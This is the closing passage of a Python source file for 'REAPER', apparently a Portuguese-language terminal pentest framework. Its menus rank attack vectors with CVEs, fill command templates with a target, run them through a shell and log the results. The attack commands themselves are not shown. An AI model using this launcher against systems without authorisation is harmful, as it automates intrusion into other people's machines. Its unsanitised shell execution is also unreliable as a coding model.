            pri_label, pri_color = PRIORITY_LABEL.get(pri, PRIORITY_LABEL[4])

            svc_str = info["services"][0] if info["services"] else "Porto aberto"
            if len(info["services"]) > 1:
                svc_str += f" +{len(info['services'])-1}"

            if info["cves"]:
                cve_str = info["cves"][0]["cve"]
                if len(info["cves"]) > 1:
                    cve_str += f" +{len(info['cves'])-1}"
            else:
                cve_str = "[dim]—[/dim]"

            rec_marker = " [bold green]◄ RECOMENDADO[/bold green]" if info["recommended"] else ""
            t.add_row(
                str(i),
                pri_label,
                f"{v['icon']} {v['label']}{rec_marker}",
                svc_str,
                cve_str,
            )
        return t

    t = _build_table()
    console.print(t)
    console.print()

    # Mostrar CVEs detalhados do vector mais crítico
    top_key = detected[0]
    top_info = enriched[top_key]
    if top_info["cves"]:
        cve_lines = []
        for c in top_info["cves"][:3]:
            cve_lines.append(f"  [bold yellow]{c['cve']}[/bold yellow]  {c['desc']}")
        console.print(Panel(
            "\n".join(cve_lines),
            title=f"[bold red]💡 REAPER RECOMENDA — {ATTACK_TREE[top_key]['icon']} {ATTACK_TREE[top_key]['label']}[/bold red]",
            border_style="red"
        ))
        console.print()

    console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")

    while True:
        ch = Prompt.ask("[bold red]REAPER › Vectores[/bold red]").strip().upper()
        if ch == "B":
            break
        elif ch.isdigit() and 1 <= int(ch) <= len(detected):
            key = detected[int(ch)-1]
            # Mostrar CVEs antes de entrar
            info = enriched[key]
            if info["cves"]:
                console.print()
                for c in info["cves"]:
                    console.print(f"  [yellow]{c['cve']}[/yellow] — {c['desc']}")
                console.print()
            _attack_vector_menu(key, target, project, save_fn)
            console.clear()
            _banner_intel()
            t = _build_table()
            console.print(t)
            console.print()
            if top_info["cves"]:
                cve_lines = []
                for c in top_info["cves"][:3]:
                    cve_lines.append(f"  [bold yellow]{c['cve']}[/bold yellow]  {c['desc']}")
                console.print(Panel(
                    "\n".join(cve_lines),
                    title=f"[bold red]💡 REAPER RECOMENDA — {ATTACK_TREE[top_key]['icon']} {ATTACK_TREE[top_key]['label']}[/bold red]",
                    border_style="red"
                ))
                console.print()
            console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")

def _manual_vector_menu(target, project, save_fn):
    """Escolha manual de vector de ataque."""
    console.clear()
    _banner_intel()

    all_vectors = [(k, v) for k, v in ATTACK_TREE.items() if k not in ("privesc","hashes")]

    t = Table(box=box.ROUNDED, border_style="red", header_style="bold red", show_lines=True)
    t.add_column("#",       style="bold cyan",  width=4, justify="center")
    t.add_column("Vector",  style="bold white", width=22)
    t.add_column("Descrição", style="dim white", width=40)

    for i, (k, v) in enumerate(all_vectors, 1):
        num_attacks = len(v["attacks"])
        t.add_row(str(i), f"{v['icon']} {v['label']}", f"{num_attacks} técnicas disponíveis")

    console.print(t)
    console.print()
    console.print("[dim][número] Escolher  [B] Voltar[/dim]")

    ch = Prompt.ask("[bold red]REAPER › Vector[/bold red]").strip().upper()
    if ch != "B" and ch.isdigit() and 1 <= int(ch) <= len(all_vectors):
        key = all_vectors[int(ch)-1][0]
        _attack_vector_menu(key, target, project, save_fn)

def _attack_vector_menu(vector_key, target, project, save_fn):
    """Menu de ataques para um vector específico."""
    vector = ATTACK_TREE[vector_key]
    color  = vector["color"]
    attacks = vector["attacks"]

    # Histórico de tentativas nesta sessão
    tried    = set()
    success  = set()

    while True:
        console.clear()
        _banner_intel()
        console.print(Panel(
            f"[{color}]{vector['icon']} {vector['label'].upper()}[/{color}]\n"
            f"[dim]Alvo: {target}[/dim]",
            border_style=color
        ))
        console.print()

        t = Table(box=box.ROUNDED, border_style=color, header_style=f"bold {color}", show_lines=True)
        t.add_column("#",          style=f"bold {color}", width=4, justify="center")
        t.add_column("Técnica",    style="bold white",    width=28)
        t.add_column("Descrição",  style="dim white",     width=38)
        t.add_column("Estado",     width=10, justify="center")

        for i, atk in enumerate(attacks, 1):
            if i in success:
                estado = "[green]✔ OK[/green]"
            elif i in tried:
                estado = "[red]✘ Fail[/red]"
            else:
                estado = "[dim]—[/dim]"
            t.add_row(str(i), atk["name"], atk["desc"], estado)

        console.print(t)
        console.print()
        console.print("[dim][número] Executar técnica  [B] Voltar[/dim]")

        ch = Prompt.ask(f"[{color}]REAPER › {vector['label']}[/{color}]").strip().upper()
        if ch == "B":
            break
        elif ch.isdigit() and 1 <= int(ch) <= len(attacks):
            idx    = int(ch)
            result = _run_attack(attacks[idx-1], target, color, project, save_fn)
            tried.add(idx)
            if result == "success":
                success.add(idx)

def _run_attack(attack, target, color, project, save_fn):
    """Executa um ataque específico com recolha de parâmetros."""
    console.clear()
    _banner_intel()

    console.print(Panel(
        f"[{color}]{attack['name'].upper()}[/{color}]\n[dim]{attack['desc']}[/dim]",
        border_style=color
    ))
    console.print()

    # Dicas
    if attack.get("hints"):
        console.print(Panel(
            f"[yellow]💡 DICAS[/yellow]\n{attack['hints']}",
            border_style="yellow", padding=(0,2)
        ))
        console.print()

    # Parâmetros
    values = {}
    params = [dict(p) for p in attack.get("params", [])]
    for p in params:
        p["default"] = p["default"].replace("{TARGET}", target)

    if params:
        console.print(f"[{color}]Parâmetros:[/{color}] [dim](ENTER para aceitar)[/dim]\n")
        for p in params:
            d = p["default"]
            label_clean = p['label'].lower().replace(" ", "")
            d_clean = d.lower().replace(" ", "") if d else ""
            show_default = d and d_clean not in label_clean and label_clean not in d_clean
            if show_default:
                label_str = f"  [{color}]{p['label']}[/{color}] [dim]({d})[/dim]"
            else:
                label_str = f"  [{color}]{p['label']}[/{color}]"
            val = Prompt.ask(label_str, default=d)
            values[p["key"]] = val
    else:
        console.print("[dim]Este comando não necessita de parâmetros adicionais.[/dim]\n")

    # Montar comando
    cmd = attack["cmd"]
    for k, v in values.items():
        cmd = cmd.replace("{" + k + "}", v)

    console.print()
    console.print(Panel(f"[bold green]{cmd}[/bold green]", title="Comando", border_style="green"))
    console.print()

    # Acções
    opts = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    opts.add_column(style="bold cyan", width=6); opts.add_column()
    opts.add_row("[1]", "Executar agora")
    opts.add_row("[2]", "Guardar nas notas")
    opts.add_row("[3]", "Executar e guardar")
    opts.add_row("[B]", "Voltar")
    console.print(opts)

    ch = Prompt.ask(f"[{color}]Acção[/{color}]").strip().upper()

    if ch in ["1", "3"]:
        console.print(f"\n[yellow]A executar...[/yellow]\n")
        console.print(Rule(style="dim green"))
        try:
            subprocess.run(cmd, shell=True)
        except KeyboardInterrupt:
            console.print("\n[yellow]Interrompido. A voltar ao menu...[/yellow]")
        except Exception as _ex:
            console.print(f"\n[red]Erro ao executar: {_ex}[/red]")
        finally:
            console.print(Rule(style="dim green"))
        console.print()

    if ch in ["2", "3"]:
        phase_data = project["phases"].get("5", {})
        existing   = phase_data.get("notas", "")
        ts         = datetime.datetime.now().strftime("%H:%M:%S")
        entry      = f"[{ts}] {attack['name']}: {cmd}"
        phase_data["notas"] = (existing + "\n" + entry).strip()
        project["phases"]["5"] = phase_data
        save_fn()
        console.print(f"[green]✔ Guardado nas notas.[/green]")

    if ch in ["1", "3"]:
        # Perguntar resultado
        console.print()
        res = Prompt.ask(
            f"[{color}]Resultado[/{color}]\n  [1] Sucesso — funcionou!\n  [2] Falhou\n  [B] Continuar\n\nEscolha"
        ).strip()

        if res == "1":
            _show_next_steps(attack, "success", color)
            return "success"
        elif res == "2":
            _show_next_steps(attack, "fail", color)
            return "fail"
    else:
        _pause()
    return None

def _show_next_steps(attack, outcome, color):
    """Mostra sugestões de próximos passos consoante o resultado."""
    followup = attack.get("followup", {}).get(outcome, [])
    console.print()

    if outcome == "success":
        console.print(Panel("[bold green]✔ SUCESSO![/bold green]\nPróximos passos sugeridos:", border_style="green"))
    else:
        console.print(Panel("[bold red]✘ Falhou[/bold red]\nTenta estes vectores alternativos:", border_style="red"))

    if followup:
        for i, step in enumerate(followup, 1):
            console.print(f"  [{i}] [cyan]{step.replace('_', ' ').title()}[/cyan]")
    else:
        console.print("  [dim]Sem sugestões automáticas — volta ao menu e tenta outro vector.[/dim]")

    console.print()
    _pause()

def _pause():
    console.print("[dim]Prima ENTER para continuar...[/dim]")
    input()



# ── Entry point ──────────────────────────────────────────────
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print("\n\n[bold red]Sessão terminada. Stay sharp.[/bold red]\n")
        sys.exit(0)
    except Exception as _e:
        console.print(f"\n[red]Erro inesperado: {_e}[/red]")
        console.print("[dim]Reinicia o REAPER com: python3 reaper.py[/dim]\n")
        sys.exit(1)
